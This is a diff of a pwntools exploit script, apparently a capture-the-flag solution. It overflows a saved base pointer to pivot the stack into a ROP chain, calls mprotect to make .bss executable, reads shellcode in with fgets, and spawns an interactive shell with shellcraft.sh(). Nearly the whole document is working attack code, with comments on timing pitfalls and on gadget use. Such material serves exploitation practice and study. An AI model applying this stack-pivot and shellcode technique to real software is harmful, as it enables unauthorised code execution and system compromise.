@@ -16,9 +16,7 @@ def conn():
         r = process([e.path], stdin=process.PTY, stdout=process.PTY)
     elif args.GDB:
         r = gdb.debug([e.path], '''
-                      b *(training+69)
-                      b *(target_dummy+354)
-                      b *(training+0x7d)
+                      b *(training+126)
                       c
                       ''', stdin=process.PTY, stdout=process.PTY)
     elif args.REMOTE:
@@ -32,51 +30,38 @@ def conn():
 
 def main():
     r = conn()
-    # TODO: Somehow this doesn't work, the fgets() in the stage_1 code just cannot read data into the .bss.
 
-    # About how to call these libc functions, use godbolt.org with following snippet:
-##include <sys/mman.h>
-##include <stdio.h>
-
-# int main() {
-#     char buff[10];
-#     mprotect(buff, 10, PROT_EXEC|PROT_READ|PROT_WRITE);
-#     fgets(buff, 10, 0);
-#     return 0;
-# }
+    # The way to call mprotect() and fgets() can be found in https://godbolt.org/z/oGhnvvrcY.
 
     # Overwrites the $rbp value saved on stack to the newly allocated heap address.
     # When the training() returns, $rsp will be changed to this heap address. (mov rsp, rbp; pop rbp; ret)
     # Thus we control the whole function stack frame, making ROP feasible.
-    r.sendlineafter(b'shoot:', b'-2')
-    info(f'.BSS is at {hex(e.bss())}')
     rop = ROP(e)
-    shellcode_addr = e.bss(offset=0x200) # leave some buffer for .bss original content
-    stage_2_buffer_size = 8
+    syscall = rop.find_gadget(['syscall', 'ret'])[0]
+    r.sendlineafter(b':', b'-2')
+    head_buff_size = 8
     stage_1 = flat(
-            # Change bss NX bit
-            b'\x90' * 8, # garbage for "pop rbp" in training()
+            # Change .bss to rwx
+            b'\x90' * 8, # garbage for passing "pop rbp" in the "mov rsp, rbp; pop rbp; ret;"
             rop.rdi[0], e.bss(), # addr
             rop.rsi[0], 0x1000, # size
-            rop.rdx[0], 0x7, # rwx
+            rop.rdx[0], 7, # rwx
             e.sym.mprotect,
-            # Read the next stage shellcode to bss
-            rop.rdi[0], shellcode_addr,
-            rop.rsi[0], 0x80,
-            rop.rdx[0], e.sym.__stdin_FILE,
-            e.sym.fgets_unlocked,
-            shellcode_addr + stage_2_buffer_size,
+            # Read the next stage shellcode
+            rop.rdi[0], e.bss(), # addr
+            rop.rsi[0], 0x80, # size
+            rop.rdx[0], e.sym.__stdin_FILE, # stream (stdin)
+            e.sym.fgets,
+            e.bss() + head_buff_size,
             )
-    success(f'stage_1 bytes are {hex(len(stage_1))}') # 0x80, just as big as the allowed size.
+    r.recvuntil(b'>')
+    # !!!!NOTE: you have to use send here otherwise there will be an extra newline in the stdin buffer and thus it ends the fgets() in stage_1 immediately
     r.send(stage_1)
 
-    # stage 2 is to send the actual shellcode.
-    stage_2_buffer_size = 8
     stage_2 = flat(
             # !!!!Note that we need extra buffer here because somehow the first few instructions may be interpreted incorrectly with 0s before it.
-            b'\x90' * 8,
-            asm(shellcraft.sh()),
-            )
+            {head_buff_size: asm(shellcraft.sh())}
+            , filler=b'\x90')
     r.sendline(stage_2)
 
     r.interactive()
